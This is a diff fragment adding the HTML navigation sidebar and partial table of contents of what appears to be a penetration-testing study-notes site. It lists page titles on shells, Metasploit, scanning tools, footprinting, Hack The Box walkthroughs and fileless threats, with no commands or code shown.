+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/SpawningInteractiveShells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SpawningInteractiveShells
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/Laudanum%2C%20One%20Webshell%20to%20Rule%20Them%20All/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Laudanum, One Webshell to Rule Them All
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/skillAssessment/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    skillAssessment
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/DetectionAndPrevention/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Detection &amp; Prevention Summary
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Metasploit
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Metasploit
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Metasploit/Preface/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Preface
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Tools
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            Tools
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/onesixtyone/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    onesixtyone
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Braa/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Braa
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/WinRM/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WinRM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Shodan/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shodan
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/xfreerdp/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Xfreerdp
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Nessus/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nessus
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Metasploit/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Nikto/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nikto
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Rsync/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Rsync
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/snmpwalk/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    snmpwalk
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Windows_Management_Instrumentation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows Management Instrumentation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/vnStat/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    vnStat
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/DNSenum/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNSenum
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/OpenVAS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OpenVAS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/File%20Transfer%20tools/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File Transfer tools
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/JtR/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    John the Ripper (JtR) Comprehensive Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Certutil/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Certutil
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/ssti/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    A Pentester's Guide to Server-Side Template Injection (SSTI)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Powershell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Powershell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Nmap
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            Nmap
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Firewall%20and%20IDS%20IPS%20Evasion/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Firewall and IDS IPS Evasion
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Nmap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nmap
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Service%20Enumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Service Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/nse/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NSE
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Cheatsheet/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cheatsheet
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Host%20and%20Port%20Scanning/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Host and Port Scanning
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Saving%20the%20Result/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Saving the Result
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Performance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Performance
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Nmap%20Host%20Discovery/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nmap Host Discovery
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Attacking%20Network%20Services/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Attacking Network Services
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_7" id="__nav_2_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Info Gathering Web Edition
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_7">
+            <span class="md-nav__icon md-icon"></span>
+            Info Gathering Web Edition
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Info%20Gathering%20Web%20Edition/Penetration%20Testing%20Process/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Penetration Testing Process
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_8" id="__nav_2_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Footprinting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_8">
+            <span class="md-nav__icon md-icon"></span>
+            Footprinting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/SNMP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SNMP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/NFS%20Network%20File%20System/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NFS Network File System
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/SMTP%20Simple%20Mail%20Transfer%20Protocol/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SMTP Simple Mail Transfer Protocol
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/DNS%20Domain%20Name%20System/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Domain%20Information/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Domain Information
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Cloud%20Resources/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cloud Resources
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/FTP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    FTP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/MYSQL/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MYSQL
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Windows%20Remote%20Management%20Protocols/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows Remote Management Protocols
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Enumeration%20Methodology/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Enumeration Methodology
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/MSSQL/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MSSQL
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Enumeration%20Principles/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Enumeration Principles
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/IMAP POP3.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    None
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Linux%20Remote%20Management%20Protocols/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux Remote Management Protocols
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Oracle%20-%20TNS%20Transparent%20Network%20Substate/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Oracle - TNS Transparent Network Substate
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/SMB/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SMB
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/IPMI Intelligent Platform Management Interface.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    None
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_9" id="__nav_2_9_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Skill Assessment
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_9">
+            <span class="md-nav__icon md-icon"></span>
+            Skill Assessment
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Skill%20Assessment/Footprinting%20Lab%20-%20Hard/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Footprinting Lab   Hard
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Skill%20Assessment/Footprinting_Lab_Meduim/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Footprinting Lab Meduim
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Footprinting/Skill%20Assessment/Footprinting%20Lab%20-%20Easy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Footprinting Lab   Easy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_10" id="__nav_2_10_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Vulnerability
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_10">
+            <span class="md-nav__icon md-icon"></span>
+            Vulnerability
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Common Vulnerabilities and Exposures (CVE)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Vulnerability/Common%20Vulnerability%20Scoring%20System%20%28CVSS%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Common Vulnerability Scoring System (CVSS)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Vulnerability/Assessment%20Standards/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Assessment Standards
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Vulnerability/Getting%20Started%20with%20Nessus/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Getting Started with Nessus
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Vulnerability/Vulnerability%20Assessment/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Vulnerability Assessment
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    HTB
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            HTB
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Easy
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Easy
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/Blunder/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blunder Walkthrough
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/broadlight/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Broadlight
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/busqueda/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Busqueda
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/sense/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sense
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/postman/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Postman
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/legacy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Legacy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/Bashed/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bashed
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/Beep/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Beep
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/easy/Buff/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Buff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Meduim
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Meduim
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/meduim/active/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/meduim/jeeves/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Jeeves
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Hard
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Hard
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../HTB/hard/hard/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hard
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#fileless-threats-and-file-transfer" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fileless Threats and File Transfer
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-are-fileless-threats" class="md-nav__link">
+    <span class="md-ellipsis">
+      What Are Fileless Threats?
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#breakdown-of-the-astaroth-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Breakdown of the Astaroth Attack
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#abuse-of-wmic-tool" class="md-nav__link">
+    <span class="md-ellipsis">
+      Abuse of WMIC Tool
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
